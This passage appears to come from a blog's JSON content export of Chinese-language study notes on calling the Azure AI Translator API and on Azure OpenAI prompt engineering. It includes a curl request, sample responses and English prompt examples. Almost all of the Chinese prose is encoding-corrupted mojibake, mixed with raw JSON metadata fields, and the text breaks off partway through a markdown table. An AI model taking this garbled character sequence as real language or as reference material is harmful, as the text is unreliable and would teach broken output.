IDï¼ˆå±å¹•æˆªå›¾ä¸­çªå‡ºæ˜¾ç¤ºï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ category å‚æ•°åœ¨å¯¹ Azure AI ç¿»è¯‘èµ„æºçš„ç¿»è¯‘è°ƒç”¨ä¸­æŒ‡å®šè¯¥ IDï¼Œä»è€Œä½¿ç”¨è‡ªå®šä¹‰æ¨¡å‹ï¼ˆè€Œä¸æ˜¯é»˜è®¤æ¨¡å‹ï¼‰æ‰§è¡Œç¿»è¯‘ã€‚ å¦‚ä½•è°ƒç”¨ APIè‹¥è¦å¯åŠ¨ç¿»è¯‘ï¼Œè¯·å°† POST è¯·æ±‚å‘é€åˆ°ä»¥ä¸‹è¯·æ±‚ URLï¼š 1https://api.cognitive.microsofttranslator.com/translate?api-version=3.0 è¯·æ±‚éœ€è¦åŒ…å«å‡ ä¸ªå‚æ•°ï¼š api-versionï¼šæ‰€éœ€çš„ API ç‰ˆæœ¬ã€‚ toï¼šè¦ç¿»è¯‘åˆ°çš„ç›®æ ‡è¯­è¨€ã€‚ ä¾‹å¦‚ï¼š æ³•è¯­ä¸º to=frã€‚ categoryï¼šç±»åˆ« IDã€‚ è¯·æ±‚è¿˜éœ€è¦åŒ…å«å¤šä¸ªå¿…éœ€çš„æ ‡å¤´ï¼š Ocp-Apim-Subscription-Keyã€‚ å®¢æˆ·ç«¯å¯†é’¥çš„æ ‡å¤´ã€‚ ä¾‹å¦‚ï¼šOcp-Apim-Subscription-Key=&lt;your-client-key&gt;ã€‚ Content-Typeã€‚ æœ‰æ•ˆè´Ÿè½½çš„å†…å®¹ç±»å‹ã€‚ è¦æ±‚çš„æ ¼å¼ï¼šContent-Type: application/json; charset=UTF-8ã€‚ è¯·æ±‚æ­£æ–‡åº”åŒ…å«ä¸€ä¸ªæ•°ç»„ï¼Œè¯¥æ•°ç»„åŒ…å«ä¸€ä¸ª JSON å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å…·æœ‰ç”¨äºæŒ‡å®šè¦ç¿»è¯‘çš„æ–‡æœ¬çš„ Text å±æ€§ï¼š 123[ &#123;&quot;Text&quot;:&quot;Where can I find my employee details?&quot;&#125;] æœ‰å¤šç§ä¸åŒæ–¹å¼å¯ç”¨äºå°†è¯·æ±‚å‘é€åˆ° APIï¼ŒåŒ…æ‹¬ä½¿ç”¨ C#ã€Python å’Œ curlã€‚ ä¾‹å¦‚ï¼Œè‹¥è¦è¿›è¡Œå¿«é€Ÿè°ƒç”¨ï¼Œå¯ä»¥ä½¿ç”¨ curl å‘é€ POST è¯·æ±‚ï¼š 1curl -X POST &quot;https://api.cognitive.microsofttranslator.com/translate?api-version=3.0&amp;from=en&amp;to=nl&amp;category=&lt;category-id&gt;&quot; -H &quot;Ocp-Apim-Subscription-Key: &lt;your-key&quot; -H &quot;Content-Type: application/json; charset=UTF-8&quot; -d &quot;[&#123;&#x27;Text&#x27;:&#x27;Where can I find my employee details?&#x27;&#125;]&quot; ä¸Šè¿°è¯·æ±‚æ‰§è¡Œäº†ä¸€ä¸ªå°†å¥å­ä»è‹±è¯­ç¿»è¯‘ä¸ºè·å…°è¯­çš„è°ƒç”¨ã€‚ è¿”å›çš„å“åº”å¦‚æœè¯·æ±‚æˆåŠŸï¼Œå“åº”è¿”å›å“åº”ä»£ç  200ã€‚ è¿˜ä¼šè¿”å›åŒ…å«å·²ç¿»è¯‘æ–‡æœ¬çš„å“åº”æ­£æ–‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567[ &#123; &quot;translations&quot;:[ &#123;&quot;text&quot;:&quot;Waar vind ik mijn personeelsgegevens?&quot;,&quot;to&quot;:&quot;nl&quot;&#125; ] &#125;] å¦‚æœè¯·æ±‚ä¸æˆåŠŸï¼Œä¼šæ ¹æ®é”™è¯¯ç±»å‹è¿”å›ä¸åŒçš„çŠ¶æ€ä»£ç ï¼Œä¾‹å¦‚ 400ï¼ˆç¼ºå°‘æˆ–æ— æ•ˆçš„æŸ¥è¯¢å‚æ•°ï¼‰ã€‚ æœ‰å…³ä»£ç åŠå…¶è¯´æ˜çš„å®Œæ•´åˆ—è¡¨ï¼Œè¯·å‚é˜…å“åº”çŠ¶æ€ä»£ç ã€‚ https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"Azure OpenAI Generative AI Performance Tuning","slug":"Azure-OpenAIæ€§èƒ½ä¼˜åŒ–","date":"2024-06-04T16:02:33.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/05/Azure-OpenAIæ€§èƒ½ä¼˜åŒ–/","permalink":"https://banjinmei.github.io/2024/06/05/Azure-OpenAI%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/","excerpt":"","text":"Azure OpenAI æœåŠ¡åº”ç”¨æç¤ºå·¥ç¨‹Azure OpenAI ä¸­ AI æ¨¡å‹çš„å“åº”è´¨é‡å–å†³äºæä¾›çš„æç¤ºçš„è´¨é‡ã€‚ é€šè¿‡å„ç§æŠ€æœ¯æé«˜æç¤ºè´¨é‡ç§°ä¸ºæç¤ºå·¥ç¨‹ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†äº†è§£æç¤ºå·¥ç¨‹ä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒæ¥ä¼˜åŒ– Azure OpenAI æ¨¡å‹çš„æ€§èƒ½ã€‚ æç¤ºå·¥ç¨‹æ¶‰åŠè®¾è®¡å’Œä¼˜åŒ–æç¤ºï¼Œä»¥æ›´å¥½åœ°åˆ©ç”¨ Azure OpenAI æ¨¡å‹ã€‚ äº†è§£æç¤ºå·¥ç¨‹å‘é€åˆ° AI æ¨¡å‹çš„è¾“å…¥æç¤ºçš„è´¨é‡ï¼ˆå¦‚ Azure OpenAI ä¸­æä¾›çš„æç¤ºï¼‰ä¼šç›´æ¥å½±å“è¿”å›çš„å†…å®¹çš„è´¨é‡ã€‚ é€šè¿‡ä»”ç»†æ„é€ å‘é€åˆ°æ¨¡å‹çš„æç¤ºï¼Œæ¨¡å‹å¯ä»¥æä¾›æ›´å¥½ã€æ›´æœ‰è¶£çš„å“åº”ã€‚ ä»€ä¹ˆæ˜¯æç¤ºå·¥ç¨‹ç”Ÿæˆå¼ AI æ¨¡å‹åŸºäºå¤§é‡æ•°æ®è®­ç»ƒï¼Œå¯ä»¥æ ¹æ®æç¤ºçš„æœ€æœ‰å¯èƒ½çš„å»¶ç»­ç”Ÿæˆæ–‡æœ¬ã€å›¾åƒã€ä»£ç å’Œåˆ›æ„å†…å®¹ã€‚ æç¤ºå·¥ç¨‹æ˜¯è®¾è®¡å’Œä¼˜åŒ–æç¤ºä»¥æ›´å¥½åœ°åˆ©ç”¨ AI æ¨¡å‹çš„è¿‡ç¨‹ã€‚ è®¾è®¡æœ‰æ•ˆçš„æç¤ºå¯¹äºæç¤ºå·¥ç¨‹çš„æˆåŠŸè‡³å…³é‡è¦ï¼Œå®ƒå¯ä»¥æ˜¾è‘—æé«˜ AI æ¨¡å‹åœ¨ç‰¹å®šä»»åŠ¡ä¸Šçš„æ€§èƒ½ã€‚ æä¾›ç›¸å…³ã€å…·ä½“ã€æ˜ç¡®ä¸”ç»“æ„è‰¯å¥½çš„æç¤ºå¯ä»¥å¸®åŠ©æ¨¡å‹æ›´å¥½åœ°äº†è§£ä¸Šä¸‹æ–‡å¹¶ç”Ÿæˆæ›´å‡†ç¡®çš„å“åº”ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ› OpenAI æ¨¡å‹ç”Ÿæˆäº§å“è¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºå…¶æä¾›è¯¦ç»†è¯´æ˜ï¼Œæè¿°äº§å“çš„åŠŸèƒ½å’Œä¼˜åŠ¿ã€‚ é€šè¿‡æä¾›æ­¤ä¸Šä¸‹æ–‡ï¼Œæ¨¡å‹å¯ä»¥ç”Ÿæˆæ›´å‡†ç¡®ã€æ›´ç›¸å…³çš„äº§å“è¯´æ˜ã€‚ æç¤ºå·¥ç¨‹è¿˜æœ‰åŠ©äºç¼“è§£ AI æ¨¡å‹ä¸­çš„åå·®å¹¶æé«˜å…¬å¹³æ€§ã€‚ é€šè¿‡è®¾è®¡å…·æœ‰å¤šæ ·æ€§å’ŒåŒ…å®¹æ€§çš„æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿æ¨¡å‹ä¸ä¼šåå‘äºç‰¹å®šç»„æˆ–é€è§†ã€‚ é‡è¦ æ— è®ºå¯ä»¥è®¾è®¡å¤šå¥½çš„æç¤ºï¼ŒAI æ¨¡å‹çš„å“åº”éƒ½ä¸åº”è¢«è§†ä¸ºäº‹å®æˆ–å®Œå…¨æ²¡æœ‰åå·®ã€‚ å§‹ç»ˆè´Ÿè´£åœ°ä½¿ç”¨ AIã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Microsoft å…³äº Azure OpenAI çš„é€æ˜åº¦è¯´æ˜å’Œ Microsoft çš„ AI åŸåˆ™ã€‚ æ­¤å¤–ï¼Œæç¤ºå·¥ç¨‹å¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£æ¨¡å‹ç”¨æ¥ç”Ÿæˆå…¶å“åº”çš„å¼•ç”¨ã€‚ ç”Ÿæˆå¼ AI æ¨¡å‹å…·æœ‰å¤§é‡å‚æ•°ï¼Œå¹¶ä¸”å…¶éµå¾ªçš„é€»è¾‘å¯¹ç”¨æˆ·æ¥è¯´åŸºæœ¬ä¸Šæ˜¯æœªçŸ¥çš„ï¼Œå› æ­¤å¯èƒ½ä¼šå¯¹å®ƒå¦‚ä½•å¾—å‡ºå“åº”æ„Ÿåˆ°å›°æƒ‘ã€‚ é€šè¿‡è®¾è®¡æ˜“äºç†è§£å’Œè§£é‡Šçš„æç¤ºï¼Œå¯ä»¥å¸®åŠ©äººç±»æ›´å¥½åœ°äº†è§£æ¨¡å‹å¦‚ä½•ç”Ÿæˆå…¶å“åº”ã€‚ è¿™åœ¨åŒ»ç–—ä¿å¥ç­‰é¢†åŸŸå°¤å…¶é‡è¦ï¼Œå› æ­¤äº†è§£æ¨¡å‹å¦‚ä½•åšå‡ºå†³ç­–è‡³å…³é‡è¦ã€‚ è®¾è®¡è‡ªå·±çš„æç¤ºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ–¹æ³•ï¼Œå…¶ä¸­è®¸å¤šæ–¹æ³•åœ¨æœ¬æ¨¡å—çš„åç»­å•å…ƒä¸­è¿›è¡Œäº†ä»‹ç»ã€‚ å…¶ä¸­åŒ…æ‹¬æä¾›è¯´æ˜ã€ä¸Šä¸‹æ–‡å†…å®¹ã€æç¤ºæˆ–å°‘é‡ç¤ºä¾‹ï¼Œä»¥åŠå¯¹æç¤ºä¸­çš„å†…å®¹è¿›è¡Œæ­£ç¡®æ’åºã€‚ æ­¤å¤„ä»‹ç»çš„æ–¹æ³•å¹¶ä¸è¯¦å°½ï¼Œå› ä¸ºæ­¤é¢†åŸŸæ˜¯ä¸€ä¸ªå¾®å¦™è€Œæµç•…çš„ä¸»é¢˜ã€‚ API ç»ˆç»“ç‚¹çš„æ³¨æ„äº‹é¡¹æœ¬æ¨¡å—å…¶ä½™éƒ¨åˆ†çš„ç¤ºä¾‹å°†é‡ç‚¹ä»‹ç» ChatCompletionã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒChatCompletion ä¹Ÿå¯ç”¨äºéèŠå¤©åœºæ™¯ï¼Œå…¶ä¸­ä»»ä½•è¯´æ˜éƒ½åŒ…å«åœ¨ç³»ç»Ÿæ¶ˆæ¯ä¸­ï¼Œç”¨æˆ·å†…å®¹åœ¨ç”¨æˆ·è§’è‰²æ¶ˆæ¯ä¸­æä¾›ã€‚ å¦‚æœ‰éœ€è¦ï¼Œå…¶ä¸­å¤§å¤šæ•°ç¤ºä¾‹å¯ä»¥æ”¹ä¸ºä½¿ç”¨ Completion ç»ˆç»“ç‚¹ã€‚ å°±æ¨¡å‹å¯ç”¨æ€§è€Œè¨€ï¼ŒCompletion ç»ˆç»“ç‚¹å¯ä»¥ç”¨äº gpt-3 å’Œæ›´æ—©ç‰ˆæœ¬ï¼Œè€Œ ChatCompletion å¯ç”¨äº gpt-35-turbo å’Œæ›´é«˜ç‰ˆæœ¬çš„æ¨¡å‹ã€‚ è°ƒæ•´æ¨¡å‹å‚æ•°é™¤äº†æœ¬æ¨¡å—ä¸­è®¨è®ºçš„æŠ€æœ¯å¤–ï¼Œè°ƒæ•´æ¨¡å‹å‚æ•°å¯èƒ½ä¼šå¯¹å“åº”äº§ç”Ÿé‡å¤§å½±å“ã€‚ ç‰¹åˆ«æ˜¯ï¼Œtemperature å’Œ top_p (top_probability) æœ€æœ‰å¯èƒ½å½±å“æ¨¡å‹çš„å“åº”ï¼Œå› ä¸ºå®ƒä»¬éƒ½æ§åˆ¶æ¨¡å‹ä¸­çš„éšæœºæ€§ï¼Œä½†æ–¹å¼ä¸åŒã€‚ å€¼è¶Šé«˜ï¼Œå“åº”çš„åˆ›é€ æ€§å’Œéšæœºæ€§å°±è¶Šé«˜ï¼Œä½†å¯èƒ½ä¸å¤ªä¸€è‡´æˆ–ä¸å¤ªé›†ä¸­ã€‚ é¢„æœŸä¸ºè™šæ„æˆ–å”¯ä¸€çš„å“åº”å—ç›Šäºè¿™äº›å‚æ•°çš„è¾ƒé«˜å€¼ï¼Œè€Œéœ€è¦æ›´ä¸€è‡´ä¸”å…·ä½“çš„å†…å®¹åº”ä½¿ç”¨è¾ƒä½çš„å€¼ã€‚ å°è¯•ä½¿ç”¨ç›¸åŒçš„æç¤ºè°ƒæ•´è¿™äº›å‚æ•°ï¼Œä»¥æŸ¥çœ‹å®ƒä»¬å¦‚ä½•å½±å“å“åº”ã€‚ å»ºè®®ä¸€æ¬¡æ›´æ”¹ temperature æˆ– top_pï¼Œä½†ä¸èƒ½åŒæ—¶æ›´æ”¹ä¸¤è€…ã€‚ ç¼–å†™æ›´æœ‰æ•ˆçš„æç¤ºAzure OpenAI æ¨¡å‹èƒ½å¤Ÿä»¥æƒŠäººçš„å‡†ç¡®åº¦ç”Ÿæˆå¯¹è‡ªç„¶è¯­è¨€æŸ¥è¯¢çš„å“åº”ã€‚ ä½†æ˜¯ï¼Œå“åº”çš„è´¨é‡åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºæç¤ºçš„å†™å…¥ç¨‹åº¦ã€‚ å¼€å‘äººå‘˜å¯ä»¥é€šè¿‡åœ¨å…¶æç¤ºä¸­ä½¿ç”¨ä¸åŒæŠ€æœ¯æ¥ä¼˜åŒ– Azure OpenAI æ¨¡å‹çš„æ€§èƒ½ï¼Œä»è€Œç”Ÿæˆæ›´å‡†ç¡®ã€æ›´ç›¸å…³çš„å“åº”ã€‚ æä¾›æ¸…æ™°è¯´æ˜æ˜ç¡®è¯¢é—® Azure OpenAI æ¨¡å‹æ‰€éœ€çš„å†…å®¹æ˜¯è·å–æ‰€éœ€ç»“æœçš„ä¸€ç§æ–¹æ³•ã€‚ é€šè¿‡å°½å¯èƒ½çš„æè¿°ï¼Œæ¨¡å‹å¯ä»¥ç”Ÿæˆæœ€ç¬¦åˆæ‰€éœ€å†…å®¹çš„å“åº”ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³è¦ä¸ºæ–°çš„æ°´ç“¶åˆ›å»ºäº§å“è¯´æ˜ã€‚ è¯·è€ƒè™‘ä¸æ¯ä¸ªæç¤ºå…³è”çš„ç­”æ¡ˆï¼š æç¤º 1Write a product description for a new water bottle å“åº” 1234567Introducing the latest addition to our product line - the innovative and eco-friendly water bottle.Made from high-quality, BPA-free materials, this bottle is designed to keep your beverages at theperfect temperature for hours. Its sleek and stylish design makes it the perfect accessory for anyoutdoor activity or workout session. With its convenient carrying handle and leak-proof lid, you can take it with you wherever you go, without worrying about spills or leaks. Plus, its easy-to-cleandesign ensures that you can use it again and again, making it the perfect choice for anyone looking for a reliable and sustainable water bottle. ä¸ç±»ä¼¼çš„æç¤ºç›¸æ¯”ï¼Œå…·æœ‰æ¸…æ™°è¯´æ˜ã€‚ æç¤º 123Write a product description for a new water bottle that is 100% recycled. Be sure to include thatit comes in natural colors with no dyes, and each purchase removes 10 pounds of plastic from our oceans å“åº” 1234567Introducing our newest water bottle, the eco-friendly choice for the conscious consumer. Made from 100% recycled materials and available in natural colors with no dyes, this bottle is not only stylish but also sustainable. Each purchase of this bottle removes 10 pounds of plastic from our oceans, making it a responsible choice for those who care about the environment. Its durable and leak-proof design makes it perfect for outdoor activities, while its easy-to-carry handle makes it convenient to take on the go. Join us in our mission to reduce plastic waste and choose this eco-friendly water bottle for your daily hydration needs. åŒ…æ‹¬éœ€è¦åŒ…å«çš„è¯¦ç»†ä¿¡æ¯å¯è®©æ¨¡å‹çŸ¥é“è¦æ·»åŠ åˆ°è¯´æ˜ä¸­çš„ä¿¡æ¯ï¼Œä½¿å…¶å¯¹æ–°äº§å“çš„æè¿°æ›´åŠ å‡†ç¡®ã€‚ å¯ä»¥æ¨æ–­æ­¤æ–¹æ³•åŒ…å«å¤æ‚çš„è¯´æ˜ï¼Œä¾‹å¦‚è¦åŒ…æ‹¬çš„è¯¦ç»†ä¿¡æ¯çš„é¡¹ç›®ç¬¦å·åˆ—è¡¨ã€å“åº”çš„é•¿åº¦æˆ–è¦åŒ…å«åœ¨è¾“å‡ºä¸­çš„æ‰€éœ€æ ¼å¼ã€‚ å°è¯•ç¡®åˆ‡åœ°è¯¢é—®æƒ³è¦åœ¨ç»“æœä¸­çœ‹åˆ°çš„å†…å®¹ï¼Œä½ å¯èƒ½ä¼šå¯¹æ¨¡å‹æ»¡è¶³è¯·æ±‚çš„æ•ˆæœæ„Ÿåˆ°æƒŠè®¶ã€‚ è¯´æ˜çš„æ ¼å¼å¦‚ä½•è®¾ç½®è¯´æ˜çš„æ ¼å¼å¯èƒ½ä¼šå½±å“æ¨¡å‹è§£é‡Šæç¤ºçš„æ–¹å¼ã€‚ è¿‘åº¦åå·®å¯èƒ½ä¼šå½±å“æ¨¡å‹ï¼Œå…¶ä¸­ä½äºæç¤ºæœ«å°¾çš„ä¿¡æ¯å¯¹è¾“å‡ºçš„å½±å“æ¯”å¯¹å¼€å¤´çš„ä¿¡æ¯çš„å½±å“æ›´å¤§ã€‚ é€šè¿‡é‡å¤æç¤ºæœ«å°¾çš„è¯´æ˜å’Œè¯„ä¼°å¯¹ç”Ÿæˆçš„å“åº”çš„å½±å“ï¼Œå¯ä»¥è·å¾—æ›´å¥½çš„å“åº”ã€‚ åœ¨èŠå¤©æ–¹æ¡ˆä¸­ä½¿ç”¨ ChatCompletion æ—¶ï¼Œè¿™ç§è¿‘åº¦åå·®ä¹Ÿä¼šèµ·ä½œç”¨ï¼Œå…¶ä¸­æç¤ºä¸­åŒ…å«çš„å¯¹è¯ä¸­è¾ƒæ–°çš„æ¶ˆæ¯å¯¹å“åº”çš„å½±å“æ›´å¤§ã€‚ ä¸‹ä¸€ä¸ªå•å…ƒæ›´æ·±å…¥åœ°ä»‹ç»å¦‚ä½•ä½¿ç”¨å¯¹è¯æ¥æé«˜å“åº”è´¨é‡ï¼Œä½†å°†é‡è¦ä¿¡æ¯æ”¾åœ¨æç¤ºçš„æœ«å°¾é™„è¿‘å¯èƒ½ä¼šè·å¾—æ›´å¥½çš„å“åº”ã€‚ ä½¿ç”¨èŠ‚æ ‡è®°è®¾ç½®è¯´æ˜æ ¼å¼çš„ç‰¹å®šæŠ€æœ¯æ˜¯æ‹†åˆ†æç¤ºå¼€å¤´æˆ–æœ«å°¾çš„è¯´æ˜ï¼Œå¹¶åœ¨ --- æˆ– ### å—ä¸­åŒ…å«ç”¨æˆ·å†…å®¹ã€‚ è¿™äº›æ ‡è®°ä½¿æ¨¡å‹èƒ½å¤Ÿæ›´æ¸…æ¥šåœ°åŒºåˆ†è¯´æ˜å’Œå†…å®¹ã€‚ ä¾‹å¦‚ï¼š 12345Translate the text into French---What&#x27;s the weather going to be like today?--- æ³¨æ„ åˆ†åŒºæ ‡è®°çš„æœ€ä½³åšæ³•å¯èƒ½ä¼šéšç€å°†æ¥çš„ç‰ˆæœ¬è€Œæ›´æ”¹ã€‚ ä¸»è¦å†…å®¹ã€æ”¯æŒå†…å®¹å’ŒåŸºç¡€å†…å®¹åŒ…æ‹¬ç”¨äºå“åº”çš„æ¨¡å‹çš„å†…å®¹ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿæ›´å‡†ç¡®åœ°å›ç­”ã€‚ å¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥è€ƒè™‘æ­¤å†…å®¹ï¼šä¸»è¦å†…å®¹å’Œæ”¯æŒå†…å®¹ã€‚ ä¸»è¦å†…å®¹æ˜¯æŒ‡ä½œä¸ºæŸ¥è¯¢ä¸»é¢˜çš„å†…å®¹ï¼Œä¾‹å¦‚è¦ç¿»è¯‘çš„å¥å­æˆ–è¦æ±‡æ€»çš„æ–‡ç« ã€‚ æ­¤å†…å®¹é€šå¸¸åŒ…å«åœ¨æç¤ºçš„å¼€å¤´æˆ–æœ«å°¾ï¼ˆä½œä¸ºè¯´æ˜ï¼Œå¹¶æŒ‰ --- å—è¿›è¡ŒåŒºåˆ†ï¼‰ï¼Œå…¶ä¸­åŒ…å«ä»‹ç»å¦‚ä½•ä½¿ç”¨å®ƒçš„è¯´æ˜ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ç¯‡è¦æ€»ç»“çš„é•¿æ–‡ç« ã€‚ æˆ‘ä»¬å¯ä»¥å°†å…¶æ”¾åœ¨æç¤ºç¬¦çš„ --- å—ä¸­ï¼Œç„¶åä»¥è¯´æ˜ç»“å°¾ã€‚ 12345---&lt;insert full article here, as primary content&gt;---Summarize this article and identify three takeaways in a bulleted list æ”¯æŒå†…å®¹æ˜¯å¯èƒ½ä¼šæ”¹å˜å“åº”çš„å†…å®¹ï¼Œä½†ä¸æ˜¯æç¤ºçš„ç„¦ç‚¹æˆ–ä¸»é¢˜ã€‚ æ”¯æŒå†…å®¹çš„ç¤ºä¾‹åŒ…æ‹¬åç§°ã€é¦–é€‰é¡¹ã€å“åº”ä¸­è¦åŒ…å«çš„æœªæ¥æ—¥æœŸç­‰ã€‚ æä¾›æ”¯æŒå†…å®¹å¯è®©æ¨¡å‹åšå‡ºæ›´å®Œæ•´ã€æ›´å‡†ç¡®çš„å“åº”ï¼Œå¹¶ä¸”æ›´æœ‰å¯èƒ½åŒ…å«æ‰€éœ€ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œé‰´äºä¿ƒé”€ç”µå­é‚®ä»¶éå¸¸é•¿ï¼Œæ¨¡å‹èƒ½å¤Ÿæå–å…³é”®ä¿¡æ¯ã€‚ å¦‚æœéšååœ¨æç¤ºä¸­æ·»åŠ æ”¯æŒå†…å®¹ï¼Œå¹¶æŒ‡å®šè¦æŸ¥æ‰¾çš„ç‰¹å®šå†…å®¹ï¼Œåˆ™æ¨¡å‹å¯ä»¥æä¾›æ›´æœ‰ç”¨çš„å“åº”ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”µå­é‚®ä»¶æ˜¯ä¸»è¦å†…å®¹ï¼Œå¹¶å°†ä½ æ„Ÿå…´è¶£çš„å…·ä½“å†…å®¹ä½œä¸ºæ”¯æŒå†…å®¹ 1234567---&lt;insert full email here, as primary content&gt;---&lt;the next line is the supporting content&gt;Topics I&#x27;m very interested in: AI, webinar dates, submission deadlinesExtract the key points from the above email, and put them in a bulleted list: åŸºç¡€å†…å®¹é€šè¿‡ä¸ºè¦ä»ä¸­æå–ç­”æ¡ˆçš„æ¨¡å‹æä¾›å†…å®¹ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿæä¾›å¯é çš„ç­”æ¡ˆã€‚ åŸºç¡€å†…å®¹å¯ä»¥æ˜¯è¯¢é—®ç›¸å…³é—®é¢˜çš„è®ºæ–‡æˆ–æ–‡ç« ã€å…¬å¸å¸¸è§é—®é¢˜è§£ç­”æ–‡æ¡£æˆ–æ¯”è®­ç»ƒæ¨¡å‹æ‰€åŸºäºçš„æ•°æ®æ›´æ–°çš„ä¿¡æ¯ã€‚ å¦‚æœéœ€è¦æ›´å¯é ä¸”æœ€æ–°çš„å“åº”ï¼Œæˆ–è€…éœ€è¦å¼•ç”¨æœªå‘å¸ƒçš„æˆ–ç‰¹å®šä¿¡æ¯ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨åŸºç¡€å†…å®¹ã€‚ åŸºç¡€å†…å®¹ä¸ä¸»è¦å†…å®¹ä¸åŒï¼Œå› ä¸ºå®ƒæ˜¯ç”¨äºå›ç­”æç¤ºæŸ¥è¯¢çš„ä¿¡æ¯æºï¼Œè€Œä¸æ˜¯é’ˆå¯¹æ‘˜è¦æˆ–ç¿»è¯‘ç­‰æ“ä½œçš„å†…å®¹ã€‚ ä¾‹å¦‚ï¼Œå½“æä¾›å…³äº AI å†å²çš„æœªå‘è¡¨ç ”ç©¶è®ºæ–‡æ—¶ï¼Œå®ƒå¯ä»¥ä½¿ç”¨è¯¥åŸºç¡€å†…å®¹å›ç­”é—®é¢˜ã€‚ 12345---&lt;insert unpublished paper on the history of AI here, as grounding content&gt;---Where and when did the field of AI start? æ­¤åŸºç¡€æ•°æ®ä½¿æ¨¡å‹èƒ½å¤Ÿç»™å‡ºæ›´å‡†ç¡®ã€æ›´æ˜æ™ºçš„ç­”æ¡ˆï¼Œè¿™äº›ç­”æ¡ˆå¯èƒ½ä¸æ˜¯è®­ç»ƒçš„æ•°æ®é›†çš„ä¸€éƒ¨åˆ†ã€‚ æç¤ºæç¤ºæ˜¯æ¨¡å‹æ„å»ºçš„å‰å¯¼å­—ï¼Œé€šå¸¸æœ‰åŠ©äºæœç€æ­£ç¡®æ–¹å‘å¡‘é€ å“åº”ã€‚ å®ƒä»¬é€šå¸¸ä¸è¯´æ˜ä¸€èµ·ä½¿ç”¨ï¼Œä½†å¹¶ä¸æ€»æ˜¯å¦‚æ­¤ã€‚ æç¤ºæ¨¡å‹è¿›è¡Œä»£ç ç”Ÿæˆæ—¶ï¼Œæç¤ºç‰¹åˆ«æœ‰ç”¨ã€‚ å½“å‰çš„ Azure OpenAI æ¨¡å‹å¯ä»¥ç”Ÿæˆä¸€äº›æœ‰è¶£çš„ä»£ç ç‰‡æ®µï¼Œä½†æœªæ¥æ¨¡å—ä¸­å°†æ›´æ·±å…¥åœ°ä»‹ç»ä»£ç ç”Ÿæˆã€‚ ä¾‹å¦‚ï¼Œå¦‚æœéœ€è¦å¸®åŠ©åˆ›å»º SQL æŸ¥è¯¢ï¼Œè¯·æä¾›æ‰€éœ€å†…å®¹çš„è¯´æ˜ä»¥åŠæŸ¥è¯¢çš„å¼€å¤´ï¼š 123Write a join query to get customer names with purchases in the past 30 days between tables named orders and customer on customer ID. SELECT æ¨¡å‹å“åº”ä»æç¤ºä¸­æ–­çš„ä½ç½®å¼€å§‹ï¼Œåœ¨ SQL ä¸­ç»§ç»­ï¼Œå³ä½¿æˆ‘ä»¬ä»æœªè¦æ±‚è¿‡ç‰¹å®šè¯­è¨€ã€‚ å…¶ä»–ç¤ºä¾‹å¯èƒ½æ˜¯é€šè¿‡æä¾›æœ‰å…³æ‰€éœ€åº”ç”¨çš„ä»£ç æ³¨é‡Šï¼Œå¹¶åœ¨æç¤ºæœ«å°¾å°† import æ·»åŠ ä¸ºå‰å¯¼å­—ï¼Œæˆ–è€…ä»¥æ‰€éœ€è¯­è¨€æä¾›ç±»ä¼¼å†…å®¹æ¥å¸®åŠ© Python ä»£ç ã€‚ å¦ä¸€ä¸ªç¤ºä¾‹ï¼Œé‰´äºæç¤ºä¸­æœ‰å¤§é‡å®¢æˆ·è¯„è®ºï¼Œç»“å°¾ä¸ºï¼š 123Summarize the reviews above:Most common complaints:- æä¾›ä¸Šä¸‹æ–‡ä»¥æé«˜å‡†ç¡®æ€§é€šè¿‡å‘ AI æ¨¡å‹æä¾›ä¸Šä¸‹æ–‡ï¼Œä½¿æ¨¡å‹èƒ½å¤Ÿæ›´å¥½åœ°äº†è§£ä½ çš„é—®é¢˜æˆ–åº”è¯¥çŸ¥é“çš„å†…å®¹ï¼Œä»è€Œæä¾›æœ€ä½³ç­”æ¡ˆã€‚ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æä¾›ä¸Šä¸‹æ–‡ã€‚ è¯·æ±‚è¾“å‡ºç»„åˆæŒ‡å®šè¾“å‡ºçš„ç»“æ„å¯èƒ½ä¼šå¯¹ç»“æœäº§ç”Ÿå¾ˆå¤§å½±å“ã€‚ è¿™å¯èƒ½åŒ…æ‹¬è¦æ±‚æ¨¡å‹å¼•ç”¨å…¶æ¥æºã€å°†å“åº”ç¼–å†™ä¸ºç”µå­é‚®ä»¶ã€å°†å“åº”æ ¼å¼è®¾ç½®ä¸º SQL æŸ¥è¯¢ã€å°†æƒ…ç»ªåˆ†ç±»ä¸ºç‰¹å®šç»“æ„ç­‰ã€‚ ä¾‹å¦‚ï¼š æç¤º 1Write a table in markdown with 6 animals in it, with their genus and species å“åº” 12345678| Animal | Genus | Species || ---------------- |:--------------:|:--------------:|| Red Panda | Ailurus | fulgens || African Elephant | Loxodonta | africana || Snow Leopard | Panthera | uncia || Arctic Fox | 